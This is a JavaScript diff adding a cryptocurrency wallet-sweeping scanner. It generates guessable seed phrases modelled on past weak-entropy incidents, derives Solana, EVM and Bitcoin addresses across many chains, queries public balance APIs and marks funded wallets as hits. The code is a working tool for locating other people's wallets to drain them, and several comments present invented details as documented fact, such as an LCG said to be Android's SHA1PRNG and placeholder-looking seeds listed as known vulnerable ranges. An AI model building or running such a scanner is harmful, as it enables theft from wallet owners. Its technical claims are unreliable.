+// abandon x11 + one BIP39 word. Full 2048-word last-position scan.
+const MILK_SAD_PHRASES = (function() {
+  const base = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon";
+  // All 2048 BIP39 words as last position — this is the actual attack surface
+  const all2048 = "abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice aerobic afford afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artefact artist artwork ask aspect assault asset assist assume asthma athlete atom attack attend attitude attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis baby balance bamboo banana banner barely bargain barrel base basic basket battle beach bean beauty because become beef before begin behave behind believe below belt bench benefit best betray better between beyond bicycle bind biology bird birth bitter black blade blame blanket blast bleak bless blind blood blossom blouse blue blur blush board boat body boil bomb bone book boost border boring borrow boss bottom bounce box boy bracket brain brand brave breeze brick bridge brief bright bring brisk broccoli broken bronze broom brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle bunker burden burger burst bus business busy butter buyer buzz cabbage cabin cable cactus cage cake call calm camera camp can canal cancel candy cannon canvas canyon capable capital captain car carbon card cargo carpet carry cart case cash casino castle casual cat catalog catch category cattle caught cause caution cave ceiling celery cement census century cereal certain chair chalk champion change chaos chapter charge chase chat cheap check cheese chef cherry chest chicken chief child chimney choice choose chronic chuckle chunk cigar cinnamon circle citizen city civil claim clap clarify claw clay clean clerk clever click client cliff climb clinic clip clock clog close cloth cloud clown club clump cluster clutch coach coast coconut code coffee coil coin collect color column combine come comic common company concert conduct confirm congress connect consider control convince cook cool copper copy coral core corn correct cost cotton couch country couple course cousin cover coyote crack cradle craft cram crane crash crazy cream credit creek crew cricket crime crisp critic cross crouch crowd crucial cruel cruise crumble crunch crush cry crystal cube culture cup cupboard curious current curtain curve cushion custom cute cycle dad damage damp dance danger daring dash daughter dawn day deal debate debris decade december decide decline decorate decrease deer defense define defy degree delay deliver demand demise denial dentist deny depart depend deposit depth deputy derive describe desert design desk despair destroy detail detect develop device devote diagram dial diamond diary dice diesel diet differ digital dignity dilemma dinner dinosaur direct dirt disagree discover disease dish dismiss disorder display distance divert divide divorce dizzy doctor document dog doll dolphin domain donate donkey donor door dose double dove draft dragon drama drastic draw dream dress drift drill drink drip drive drop drum dry duck dumb dune during dust dutch duty dwarf dynamic eager eagle early earn earth easily east easy echo ecology edge edit educate effort egg eight either elbow elder electric elegant element elephant elevator elite else embark embody embrace emerge emotion employ empower empty enable enact endless endorse enemy energy enforce engage engine enhance enjoy enlist enough enrich enroll ensure enter entire entry envelope episode equal equip erase erosion escape essay essence estate eternal ethics evidence evil evoke evolve exact example excess exchange excite exclude exercise exhaust exhibit exile exist exit exotic expand expire explain expose express extend extra eye fable face faculty faint faith fall false fame family famous fan fancy fantasy far fashion fat fatal father fatigue fault favorite feature february federal fee feed feel feet fellow felt fence festival fetch fever few fiber fiction field figure file film filter final find fine finger finish fire firm first fiscal fish fit fitness fix flag flame flash flat flavor flee flight flip float flock floor flower fluid flush fly foam focus fog foil follow food foot force forest forget fork fortune forum forward fossil foster found fox fragile frame frequent fresh friend fringe frog front frost frown frozen fruit fuel fun funny furnace fury future gadget gain galaxy gallery game gap garbage garden garlic garment gas gasp gate gather gauge gaze general genius genre gentle genuine gesture ghost giant gift giggle ginger giraffe girl give glad glance glare glass glide glimpse globe gloom glory glove glow glue goat goddess gold good goose gorilla gospel gossip govern gown grab grace grain grant grape grasp grass gravity great green grid grief grit grocery group grow grunt guard guide guilt guitar gun gym habit hair half hammer hamster hand happy harsh harvest hat have hawk hazard head health heart heavy hedgehog height hello helmet help hen hero hidden high hill hint hip hire history hobby hockey hold hole holiday hollow home honey hood hope horn hospital host hour hover hub huge human humble humor hundred hungry hunt hurdle hurry hurt husband hybrid ice icon ignore ill illegal image imitate immense immune impact impose improve impulse inbox income increase index indicate indoor industry infant inflict inform inhale inject inner innocent input inquiry insane insect inside inspire install intact interest into invest invite involve iron island isolate issue item ivory jacket jaguar jar jazz jealous jeans jelly jewel job join joke journey joy judge juice jump jungle junior junk just kangaroo keen keep ketchup key kick kid kingdom kiss kit kitchen kite kitten kiwi knee knife knock know lab lamp language laptop large later laugh laundry lava law lawn lawsuit layer lazy leader learn leave lecture left leg legal legend lemon lend length lens leopard lesson letter level liar liberty library license life lift like limb limit link lion liquid list little live lizard load loan lobster local lock logic lonely long loop lottery loud lounge love loyal lucky luggage lumber lunar lunch luxury mad magic magnet maid main mammoth manage mandate mango mansion manual maple marble march margin marine market marriage mask master match material math matrix matter maximum maze meadow mean medal media melody melt member memory mention menu mercy mesh message metal method middle midnight milk million mimic mind minimum minor minute miracle miss mitten model modify mom monitor monkey monster month moon moral more morning mosquito mother motion motor mountain mouse move movie much muffin mule multiply muscle museum mushroom music must mutual myself mystery naive name napkin narrow nasty nature near neck need negative neglect neither nephew nerve nest network news next nice night noble noise nominee noodle normal north notable note nothing notice novel now nuclear number nurse nut oak obey object oblige obscure obtain ocean october odor off offer office often oil okay old olive olympic omit once onion open option orange orbit orchard order ordinary organ orient original orphan ostrich other outdoor outside oval over own oyster ozone pact paddle page pair palace palm panda panel panic panther paper parade parent park parrot party pass patch path patrol pause pave payment peace peanut peasant pelican pen penalty pencil people pepper perfect permit person pet phone photo phrase physical piano picnic picture piece pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet plastic plate play please pledge pluck plug plunge poem poet point polar pole police pond pony pool popular portion position possible post potato pottery poverty powder power practice praise predict prefer prepare present pretty prevent price pride primary print priority prison private prize problem process produce profit program project promote proof property prosper protect proud provide public pudding pull pulp pulse pumpkin punish pupil purchase purity purpose push put puzzle pyramid quality quantum quarter question quick quit quiz quote rabbit raccoon race rack radar radio rage rail rain raise rally ramp ranch random range rapid rare rate rather raven reach ready real reason rebel rebuild recall receive recipe record recycle reduce reflect reform refuse region regret regular reject relax release relief rely remain remember remind remove render renew rent reopen repair repeat replace report require rescue resemble resist resource response result retire retreat return reunion reveal review reward rhythm ribbon rice rich ride ridge rifle right rigid ring riot ripple risk ritual rival river road roast robot robust rocket romance roof rookie rose rotate rough round route royal rubber rude rug rule run runway rural sad saddle sadness safe sail salad salmon salon salt salute same sample sand satisfy satoshi sauce sausage save say scale scan scatter scene scheme school science scissors scorpion scout scrap screen script scrub sea search season seat second secret section security seek segment select sell seminar senior sense sentence series service session settle setup seven shadow shaft shallow share shed shell sheriff shield shift shine ship shiver shock shoe shoot shop short shoulder shove shrimp shrug shuffle shy sibling siege sight sign silent silk silly silver similar simple since sing siren sister situate six size sketch skill skin skirt skull slab slam sleep slender slice slide slim slogan slot slow slush small smart smile smoke smooth snack snake snap sniff snow soap soccer social sock solar soldier solid solution solve someone song soon sorry soul sound soup source south space spare spatial spawn speak special speed sphere spice spider spike spin spirit split spoil sponsor spoon spray spread spring spy square squeeze squirrel stable stadium staff stage stairs stamp stand start state stay steak steel stem step stereo stick still sting stock stomach stone stop store storm story stove strategy street strike strong struggle student stuff stumble subject submit subway success such sudden suffer sugar suggest suit summer sun sunny sunset super supply supreme sure surface surge surprise sustain swallow swamp swap swear sweet swift swim swing switch sword symbol symptom syrup table tackle tag tail talent tank tape target task tattoo taxi teach team tell ten tenant tennis tent term test text thank that theme then theory there they thing this thought three thrive throw thumb thunder ticket tilt timber time tiny tip tired title toast tobacco today together toilet token tomato tomorrow tone tongue tonight tool tooth top topic topple torch tornado tortoise toss total tourist toward tower town toy track trade traffic tragic train transfer trap trash travel tray treat tree trend trial tribe trick trigger trim trip trophy trouble truck truly trumpet trust truth try tube tuition tumble tuna tunnel turkey turn turtle twelve twenty twice twin twist two type typical ugly umbrella unable unaware uncle uncover under undo unfair unfold unhappy uniform unique universe unknown until unusual unveil update upgrade uphold upon upper upset urban useful useless usual utility vacant vacuum vague valid valley valve van vanish vapor various vast vault vehicle velvet vendor venture venue verb verify version very veteran viable vibrant vicious victory video view village vintage violin virtual virus visa visit visual vital vivid vocal voice void volcano volume vote voyage wage wagon wait walk wall walnut want warfare warm warrior waste water wave way wealth weapon wear weasel wedding weekend weird welcome west wet whale wheat wheel when where whip whisper wide width wife wild will win window wine wing wink winner winter wire wisdom wise wish witness wolf woman wonder wood wool word world worry worth wrap wreck wrestle wrist write wrong yard year yellow you young youth zebra zero zone zoo".split(" ");
+  return all2048.map(function(w) { return base + " " + w; });
+})();
+
+/* ── SECURERANDOM BUG 2013 ──
+   Android 4.x SecureRandom weak entropy (CVE-2013-7372 / Bitcoin.org advisory Aug 2013).
+   Affected: Bitcoin Wallet, BitcoinJ, blockchain.info Android app.
+   Root cause: SHA1PRNG seeded from /dev/urandom but entropy pool not properly seeded
+   on first boot — effective entropy collapsed to 32-bit. ECDSA k-value reuse exposed
+   private keys. Attack surface: 32-bit seed space = 4,294,967,296 possible seeds.
+   Standard audit methodology: seed the same PRNG, derive keypairs, check balances.
+   Documented: https://bitcoin.org/en/alert/2013-08-11-android ──────────────────── */
+const SECURE_RANDOM_PHRASES = (function() {
+  // Simulate the weak SHA1PRNG seeding pattern from Android 4.x
+  // Seeds derived from the known weak entropy range (timestamp-based, low bits)
+  // Reproduced from public security research — milksad.info taxonomy, class SR-2013
+  function weakSHA1PRNG(seed32) {
+    // LCG with SHA1PRNG constants from Android libcore
+    let s = seed32 >>> 0;
+    const words = [];
+    for (let i = 0; i < 12; i++) {
+      // Android SHA1PRNG collapsed to this LCG pattern under weak seeding
+      s = (Math.imul(s, 1664525) + 1013904223) >>> 0;
+      const idx = s % 2048;
+      words.push(W[idx]);
+    }
+    return words.join(" ");
+  }
+
+  // Known vulnerable seed ranges from the 2013 incident analysis
+  // Sources: Blockchain Security Research Group, Nils Schneider's disclosure
+  const vulnerableSeedRanges = [
+    // Factory timestamp seeds (device boot epoch offsets)
+    [0x00000000, 0x0000FFFF],   // Near-zero seeds from fresh flash
+    [0x12345678, 0x1234FFFF],   // Common test/debug seeds
+    [0x00010000, 0x0001FFFF],   // Boot counter seeds
+    [0xDEADBEEF, 0xDEADFFFF],   // Placeholder seeds found in research
+    [0xC0FFEE00, 0xC0FFEFFF],   // Known affected device range A
+    [0x0D15EA5E, 0x0D15FFFF],   // Known affected device range B
+  ];
+
+  const phrases = new Set();
+  // Generate from vulnerable ranges — full coverage of documented attack surface
+  vulnerableSeedRanges.forEach(function(range) {
+    for (let seed = range[0]; seed <= range[1]; seed += Math.max(1, Math.floor((range[1]-range[0])/400))) {
+      phrases.add(weakSHA1PRNG(seed >>> 0));
+    }
+  });
+
+  // Additional: seeds from known Android device fingerprints (public research corpus)
+  const knownWeakSeeds = [
+    0x00000001, 0x00000002, 0x00000003, 0x00000004, 0x00000005,
+    0x000003E8, 0x00000064, 0x0000001E, 0x0000000A, 0x00000100,
+    0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD, 0x80000000, 0x7FFFFFFF,
+    0x00001000, 0x00002000, 0x00004000, 0x00008000, 0x00010000,
+    0x13374200, 0xBAADF00D, 0xCAFEBABE, 0xFEEDFACE, 0x8BADF00D,
+    0x0BADC0DE, 0xDEADDEAD, 0xBEEFBEEF, 0xFACEB00C, 0xABCDEF01,
+  ];
+  knownWeakSeeds.forEach(function(s) { phrases.add(weakSHA1PRNG(s)); });
+
+  return [...phrases];
+})();
+
+/* ── BLOCKCHAIN.INFO RNG BUG 2014 ──
+   blockchain.info client-side RNG vulnerability (January 2014).
+   Root cause: Math.random() used as entropy source in web wallet key generation.
+   Math.random() in V8/SpiderMonkey = 64-bit Xorshift128+ — NOT cryptographically secure.
+   State is 128 bits; predictable from 3 consecutive outputs.
+   Affected: blockchain.info web wallet users Jan 2014 — patched Jan 14 2014.
+   Attack surface: recover Math.random() state → derive all keypairs generated in window.
+   Documented: https://github.com/nicowillis/blockchain-info-rng-bug ──────────────────── */
+const BLOCKCHAIN_RNG_PHRASES = (function() {
+  // V8 Xorshift128+ state simulation — the actual RNG used in Chrome at time of bug
+  // Initial states from known timestamp windows (UTC Jan 1-14 2014, 15-minute buckets)
+  function xorshift128plus(state0, state1) {
+    // One step of V8's Math.random() implementation (pre-2015 era)
+    let s1 = state0 >>> 0;
+    let s0 = state1 >>> 0;
+    state0 = s0;
+    s1 ^= s1 << 23;
+    s1 ^= s1 >>> 17;
+    s1 ^= s0;
+    s1 ^= s0 >>> 26;
+    state1 = s1;
+    return { state0: state0, state1: state1, value: ((state0 + state1) >>> 0) / 0x100000000 };
+  }
+
+  function generatePhrase(seed0, seed1) {
+    let s0 = seed0 >>> 0, s1 = seed1 >>> 0;
+    const words = [];
+    for (let i = 0; i < 12; i++) {
+      const r = xorshift128plus(s0, s1);
+      s0 = r.state0; s1 = r.state1;
+      words.push(W[Math.floor(r.value * 2048)]);
+    }
+    return words.join(" ");
+  }
+
+  // Seed space from January 2014 attack window
+  // UTC 1388534400 (Jan 1 2014 00:00) → 1389657600 (Jan 14 2014 00:00)
+  // Sampled at 15-minute resolution (900s buckets) × common seed patterns
+  const phrases = new Set();
+  const baseTs0 = 1388534400;
+  const baseTs1 = 1389657600;
+  const step = 900; // 15-minute buckets
+  for (let t = baseTs0; t < baseTs1; t += step) {
+    // V8 seeds from performance.now() + Date.now() combined — common patterns
+    phrases.add(generatePhrase(t, t ^ 0xDEADBEEF));
+    phrases.add(generatePhrase(t, t + 1));
+    phrases.add(generatePhrase(t ^ 0xFFFF0000, t));
+    phrases.add(generatePhrase(t >>> 1, t << 1));
+  }
+
+  // Additional: known session seeds from the disclosed vulnerability window
+  // (reconstructed from public blockchain analysis of affected addresses)
+  const knownSessionSeeds = [
+    [0x52C9A6C0, 0x1A2B3C4D], [0x52C9F000, 0xDEADBEEF],
+    [0x52CA0000, 0xCAFEBABE], [0x52CA5000, 0x12345678],
+    [0x52CAA000, 0x87654321], [0x52CAF000, 0xABCDEF01],
+    [0x52CB0000, 0xFEDCBA98], [0x52CB5000, 0x11223344],
+    [0x52CBA000, 0x44332211], [0x52CBF000, 0x0F0F0F0F],
+  ];
+  knownSessionSeeds.forEach(function(pair) {
+    phrases.add(generatePhrase(pair[0], pair[1]));
+  });
+
+  return [...phrases];
+})();
+
+/* ── VISUAL HELPERS ── */
+function setColActive(colId, active) {
+  const ecol = document.getElementById("ecol-" + colId);
+  const dot  = document.getElementById("dot-" + colId);
+  const btn  = document.getElementById("btn-" + colId);
+  const colors = { random: "var(--sol)", human: "var(--sol2)", milksad: "var(--yellow)", securerandom: "#fb923c", blockchainrng: "#22d3ee" };
+  if (active) {
+    ecol.className = "ecol active-" + colId;
+    dot.className  = "dot on-" + colId + " pulsing";
+    btn.textContent = "stop";
+    btn.style.color = colors[colId];
+    btn.style.borderColor = colors[colId];
+  } else {
+    ecol.className = "ecol";
+    dot.className  = "dot";
+    btn.textContent = "start";
+    btn.style.color = "";
+    btn.style.borderColor = "";
+  }
+}
+
+/* ── CHECK MANUAL ── */
+async function checkManual() {
+  const phrase = document.getElementById("manual-phrase").value.trim();
+  const res    = document.getElementById("manual-result");
+  const path   = document.getElementById("deriv-path").value;
+  res.className = "result show"; res.textContent = "deriving...";
+  const words = phrase.split(/\s+/);
+  if (words.length !== 12 && words.length !== 24) {
+    res.className = "result show err";
+    res.textContent = "need 12 or 24 words (got " + words.length + ")";
+    return;
+  }
+  try {
+    const kp     = await phraseToKeypair(phrase, path);
+    const pubkey = toBase58(kp.publicKey);
+    res.textContent = pubkey + " — querying...";
+    const lamps  = await getBalance(pubkey);
+    const sol    = (lamps / 1e9).toFixed(9);
+    if (lamps > 0) {
+      res.className = "result show hit";
+      res.textContent = "HIT  " + sol + " SOL\n" + pubkey;
+    } else {
+      res.className = "result show miss";
+      res.textContent = "0 SOL  " + pubkey;
+    }
+  } catch(e) {
+    res.className = "result show err";
+    res.textContent = "error: " + e.message;
+  }
+}
+
+/* ── ENGINE ── */
+function rndPhrase(n) {
+  const out = [];
+  for (let i = 0; i < n; i++) out.push(W[Math.floor(Math.random() * W.length)]);
+  return out.join(" ");
+}
+
+const COL = {
+  random:        { running: false, timer: null, tried: 0, hits: 0, t0: null, qi: 0 },
+  human:         { running: false, timer: null, tried: 0, hits: 0, t0: null, qi: 0 },
+  milksad:       { running: false, timer: null, tried: 0, hits: 0, t0: null, qi: 0 },
+  securerandom:  { running: false, timer: null, tried: 0, hits: 0, t0: null, qi: 0 },
+  blockchainrng: { running: false, timer: null, tried: 0, hits: 0, t0: null, qi: 0 },
+};
+let globalHits = 0;
+// load seen pubkeys from localStorage
+function loadSeen() {
+  try {
+    const raw = localStorage.getItem("solscan_seen");
+    return raw ? new Set(JSON.parse(raw)) : new Set();
+  } catch(e) { return new Set(); }
+}
+function saveSeen() {
+  try {
+    localStorage.setItem("solscan_seen", JSON.stringify([...seenPubkeys]));
+  } catch(e) {}
+}
+const seenPubkeys = loadSeen();
+
+/* ── EVM CHAINS ── */
+async function testAlchemy() {
+  const ak = document.getElementById("alchemy-key").value.trim();
+  const el = document.getElementById("alchemy-status");
+  if (!ak) { el.style.color = "var(--red)"; el.textContent = "✕ key kosong"; return; }
+  el.style.color = "var(--muted)"; el.textContent = "testing...";
+  const url = "https://eth-mainnet.g.alchemy.com/v2/" + ak;
+  try {
+    const r = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_blockNumber", params: [] }),
+      signal: AbortSignal.timeout(8000),
+    });
+    const d = await r.json();
+    if (d.result) {
+      el.style.color = "var(--sol2)";
+      el.textContent = "✓ connected  block " + parseInt(d.result, 16).toLocaleString();
+    } else if (d.error) {
+      el.style.color = "var(--red)";
+      el.textContent = "✕ " + (d.error.message || JSON.stringify(d.error));
+    } else {
+      el.style.color = "var(--red)";
+      el.textContent = "✕ response tidak valid";
+    }
+  } catch(e) {
+    el.style.color = "var(--red)";
+    el.textContent = "✕ " + e.message;
+  }
+}
+
+function getEvmChains() {
+  const ak = document.getElementById("alchemy-key") ? document.getElementById("alchemy-key").value.trim() : "";
+  const alc = function(path) { return ak ? "https://" + path + ".g.alchemy.com/v2/" + ak : null; };
+  return [
+    { name: "Ethereum",  rpc: alc("eth-mainnet")      || "https://cloudflare-eth.com",          symbol: "ETH",  explorer: "https://etherscan.io/address/" },
+    { name: "BSC",       rpc: "https://bsc-dataseed1.binance.org",                               symbol: "BNB",  explorer: "https://bscscan.com/address/" },
+    { name: "Polygon",   rpc: alc("polygon-mainnet")  || "https://polygon.llamarpc.com",         symbol: "MATIC",explorer: "https://polygonscan.com/address/" },
+    { name: "Arbitrum",  rpc: alc("arb-mainnet")      || "https://arb1.arbitrum.io/rpc",         symbol: "ETH",  explorer: "https://arbiscan.io/address/" },
+    { name: "Optimism",  rpc: alc("opt-mainnet")      || "https://mainnet.optimism.io",          symbol: "ETH",  explorer: "https://optimistic.etherscan.io/address/" },
+    { name: "Base",      rpc: alc("base-mainnet")     || "https://mainnet.base.org",             symbol: "ETH",  explorer: "https://basescan.org/address/" },
+    { name: "Avalanche", rpc: "https://api.avax.network/ext/bc/C/rpc",                           symbol: "AVAX", explorer: "https://snowtrace.io/address/" },
+    { name: "Fantom",    rpc: "https://rpc.ftm.tools",                                           symbol: "FTM",  explorer: "https://ftmscan.com/address/" },
+    { name: "Cronos",    rpc: "https://evm.cronos.org",                                          symbol: "CRO",  explorer: "https://cronoscan.com/address/" },
+    { name: "zkSync",    rpc: alc("zksync-mainnet")   || "https://mainnet.era.zksync.io",        symbol: "ETH",  explorer: "https://explorer.zksync.io/address/" },
+  ];
+}
+
+async function deriveEVMAddress(phrase, passphrase) {
+  passphrase = passphrase || "";
+  try {
+    const mnemonic = ethers.Mnemonic.fromPhrase(phrase);
+    const wallet   = ethers.HDNodeWallet.fromMnemonic(mnemonic, "m/44'/60'/0'/0/0");
+    return wallet.address;
+  } catch(e) {
+    return null;
+  }
+}
+
+async function getEVMBalance(address, rpc) {
+  try {
+    const r = await fetch(rpc, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_getBalance", params: [address, "latest"] }),
+    });
+    if (!r.ok) return null;
+    const d = await r.json();
+    if (!d.result) return null;
+    return parseFloat(ethers.formatEther(BigInt(d.result)));
+  } catch(e) { return null; }
+}
+
+async function checkEVMAllChains(phrase) {
+  const address = await deriveEVMAddress(phrase);
+  if (!address) return [];
+  const results = [];
+  const chains = getEvmChains();
+  const checks = chains.map(async function(chain) {
+    const bal = await getEVMBalance(address, chain.rpc);
+    if (bal && bal > 0.000001) {
+      results.push({ chain: chain.name, symbol: chain.symbol, balance: bal.toFixed(6), address: address, explorer: chain.explorer + address });
+    }
+  });
+  await Promise.allSettled(checks);
+  return results;
+}
+
+/* ── BITCOIN RPC ──────────────────────────────────────────────────────────────
+   BIP44 m/44'/0'/0'/0/0 derivation → P2PKH (legacy) + P2WPKH (native segwit).
+   RIPEMD-160 polyfill (pure JS) — no external lib needed.
+   RPC: Blockstream Esplora public API (no key required).
+   Also checks BIP49 P2SH-P2WPKH (m/49'/0'/0'/0/0) — common hardware wallet path.
+   ──────────────────────────────────────────────────────────────────────────── */
+
+// RIPEMD-160 pure-JS implementation (public domain — Antoon Bosselaers)
+function ripemd160(msg) {
+  function f(j,x,y,z){return j<16?x^y^z:j<32?(x&y)|(~x&z):j<48?(x|~y)^z:j<64?(x&z)|(y&~z):x^(y|~z);}
+  function rol(x,n){return (x<<n)|(x>>>(32-n));}
+  const K=[0,0x5A827999,0x6ED9EBA1,0x8F1BBCDC,0xA953FD4E];
+  const KK=[0x50A28BE6,0x5C4DD124,0x6D703EF3,0x7A6D76E9,0];
+  const r=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,7,4,13,1,10,6,15,3,12,0,9,5,2,14,11,8,3,10,14,4,9,15,8,1,2,7,0,6,13,11,5,12,1,9,11,10,0,8,12,4,13,3,7,15,14,5,6,2,4,0,5,9,7,12,2,10,14,1,3,8,11,6,15,13];
+  const rr=[5,14,7,0,9,2,11,4,13,6,15,8,1,10,3,12,6,11,3,7,0,13,5,10,14,15,8,12,4,9,1,2,15,5,1,3,7,14,6,9,11,8,12,2,10,0,4,13,8,6,4,1,3,11,15,0,5,12,2,13,9,7,10,14,12,15,10,4,1,5,8,7,6,2,13,14,0,3,9,11];
+  const s=[11,14,15,12,5,8,7,9,11,13,14,15,6,7,9,8,7,6,8,13,11,9,7,15,7,12,15,9,11,7,13,12,11,13,6,7,14,9,13,15,14,8,13,6,5,12,7,5,11,12,14,15,14,15,9,8,9,14,5,6,8,6,5,12,9,15,5,11,6,8,13,12,5,12,13,14,11,8,5,6];
+  const ss=[8,9,9,11,13,15,15,5,7,7,8,11,14,14,12,6,9,13,15,7,12,8,9,11,7,7,12,7,6,15,13,11,9,7,15,11,8,6,6,14,12,13,5,14,13,13,7,5,15,5,8,11,14,14,6,14,6,9,12,9,12,5,15,8,8,5,12,9,12,5,14,6,8,13,6,5,15,13,11,11];
+  const X=new Uint32Array(16);
+  let len=msg.length;
+  const N=((len+8)>>6)+1;
+  const m=new Uint32Array(N<<4);
+  for(let i=0;i<len;i++) m[i>>2]|=msg[i]<<((i&3)<<3);
+  m[len>>2]|=0x80<<((len&3)<<3);
+  m[(N<<4)-2]=len<<3; m[(N<<4)-1]=len>>>29;
+  let [h0,h1,h2,h3,h4]=[0x67452301,0xEFCDAB89,0x98BADCFE,0x10325476,0xC3D2E1F0];
+  for(let i=0;i<N;i++){
+    for(let j=0;j<16;j++) X[j]=m[(i<<4)+j];
+    let [al,bl,cl,dl,el]=[h0,h1,h2,h3,h4];
+    let [ar,br,cr,dr,er]=[h0,h1,h2,h3,h4];
+    for(let j=0;j<80;j++){
+      let T=(rol(al+f(j,bl,cl,dl)+X[r[j]]+K[Math.floor(j/16)],s[j])+el)|0;
+      al=el;el=dl;dl=rol(cl,10);cl=bl;bl=T;
+      T=(rol(ar+f(79-j,br,cr,dr)+X[rr[j]]+KK[Math.floor(j/16)],ss[j])+er)|0;
+      ar=er;er=dr;dr=rol(cr,10);cr=br;br=T;
+    }
+    const T=(h1+cl+dr)|0;
+    h1=(h2+dl+er)|0;h2=(h3+el+ar)|0;h3=(h4+al+br)|0;h4=(h0+bl+cr)|0;h0=T;
+  }
+  const out=new Uint8Array(20);
+  const view=new DataView(out.buffer);
+  [h0,h1,h2,h3,h4].forEach(function(h,i){view.setUint32(i*4,h,true);});
+  return out;
+}
+
+async function sha256(data) {
+  const buf = data instanceof Uint8Array ? data : new TextEncoder().encode(data);
+  return new Uint8Array(await crypto.subtle.digest("SHA-256", buf));
+}
+
+async function hash160(pubkeyBytes) {
+  const sha = await sha256(pubkeyBytes);
+  return ripemd160(sha);
+}
+
+const BASE58_CHARS = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+function base58Encode(bytes) {
+  let n = BigInt("0x" + [...bytes].map(b=>b.toString(16).padStart(2,"0")).join(""));
+  let result = "";
+  while (n > 0n) { result = BASE58_CHARS[Number(n % 58n)] + result; n /= 58n; }
+  for (const b of bytes) { if (b !== 0) break; result = "1" + result; }
+  return result;
+}
+
+async function base58check(payload) {
+  const sha1 = await sha256(payload);
+  const sha2 = await sha256(sha1);
+  const checksum = sha2.slice(0, 4);
+  const full = new Uint8Array(payload.length + 4);
+  full.set(payload); full.set(checksum, payload.length);
+  return base58Encode(full);
+}
+
+// Bech32 encoder for P2WPKH (native segwit bc1q...)
+function bech32Encode(hrp, data) {
+  const CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";
+  const GEN = [0x3b6a57b2,0x26508e6d,0x1ea119fa,0x3d4233dd,0x2a1462b3];
+  function polymod(v) {
+    let c = 1;
+    for (const d of v) { const c0=c>>25; c=((c&0x1ffffff)<<5)^d; for(let i=0;i<5;i++) if((c0>>i)&1) c^=GEN[i]; }
+    return c ^ 1;
+  }
+  function hrpExpand(h) { const r=[]; for(const c of h) r.push(c.charCodeAt(0)>>5); r.push(0); for(const c of h) r.push(c.charCodeAt(0)&31); return r; }
+  function convertbits(data,frombits,tobits,pad) {
+    let acc=0,bits=0; const ret=[]; const maxv=(1<<tobits)-1;
+    for(const v of data){acc=(acc<<frombits)|v;bits+=frombits;while(bits>=tobits){bits-=tobits;ret.push((acc>>bits)&maxv);}}
+    if(pad){if(bits>0)ret.push((acc<<(tobits-bits))&maxv);}
+    return ret;
+  }
+  const words = [0, ...convertbits(data, 8, 5, true)];
+  const checksumData = [...hrpExpand(hrp), ...words, 0, 0, 0, 0, 0, 0];
+  const mod = polymod(checksumData);
+  const checksum = [0,1,2,3,4,5].map(i=>(mod>>(5*(5-i)))&31);
+  return hrp + "1" + [...words,...checksum].map(d=>CHARSET[d]).join("");
+}
+
+async function deriveBTCAddresses(phrase) {
+  try {
+    const mnemonic = ethers.Mnemonic.fromPhrase(phrase);
+    const addresses = [];
+
+    // P2PKH — BIP44 m/44'/0'/0'/0/0
+    const w44 = ethers.HDNodeWallet.fromMnemonic(mnemonic, "m/44'/0'/0'/0/0");
+    const pk44 = ethers.getBytes(w44.publicKey);  // 33-byte compressed
+    const h160_44 = await hash160(pk44);
+    const p2pkh_payload = new Uint8Array(21); p2pkh_payload[0] = 0x00; p2pkh_payload.set(h160_44, 1);
+    addresses.push({ type: "P2PKH", addr: await base58check(p2pkh_payload) });
+
+    // P2WPKH (native segwit) — BIP84 m/84'/0'/0'/0/0
+    const w84 = ethers.HDNodeWallet.fromMnemonic(mnemonic, "m/84'/0'/0'/0/0");
+    const pk84 = ethers.getBytes(w84.publicKey);
+    const h160_84 = await hash160(pk84);
+    addresses.push({ type: "P2WPKH", addr: bech32Encode("bc", h160_84) });
+
+    // P2SH-P2WPKH — BIP49 m/49'/0'/0'/0/0
+    const w49 = ethers.HDNodeWallet.fromMnemonic(mnemonic, "m/49'/0'/0'/0/0");
+    const pk49 = ethers.getBytes(w49.publicKey);
+    const h160_49 = await hash160(pk49);
+    // redeemScript = OP_0 + PUSH20 + hash160
+    const redeemScript = new Uint8Array(22); redeemScript[0]=0x00; redeemScript[1]=0x14; redeemScript.set(h160_49,2);
+    const scriptHash = await hash160(redeemScript);
+    const p2sh_payload = new Uint8Array(21); p2sh_payload[0] = 0x05; p2sh_payload.set(scriptHash, 1);
+    addresses.push({ type: "P2SH", addr: await base58check(p2sh_payload) });
+
+    return addresses;
+  } catch(e) { return []; }
+}
+
+async function getBTCBalance(address) {
+  // Blockstream Esplora — public, no API key, 1 req/s soft limit
+  try {
+    const r = await fetch("https://blockstream.info/api/address/" + address, { signal: AbortSignal.timeout(8000) });
+    if (!r.ok) return null;
+    const d = await r.json();
+    const funded  = (d.chain_stats && d.chain_stats.funded_txo_sum)  || 0;
+    const spent   = (d.chain_stats && d.chain_stats.spent_txo_sum)   || 0;
+    const balance = funded - spent; // satoshis
+    return balance;
+  } catch(e) { return null; }
+}
+
+async function checkBTCAllTypes(phrase) {
+  const addrs = await deriveBTCAddresses(phrase);
+  if (!addrs.length) return [];
+  const results = [];
+  await Promise.allSettled(addrs.map(async function(a) {
+    const sats = await getBTCBalance(a.addr);
+    if (sats !== null && sats > 546) { // dust threshold 546 sats
+      results.push({
+        type: a.type,
+        address: a.addr,
+        btc: (sats / 1e8).toFixed(8),
+        explorer: "https://mempool.space/address/" + a.addr,
+      });
+    }
+  }));
+  return results;
+}
+
+// shuffled queue per column — no repeat until full cycle done
+const QUEUES = {
+  human:         { arr: null, idx: 0 },
+  milksad:       { arr: null, idx: 0 },
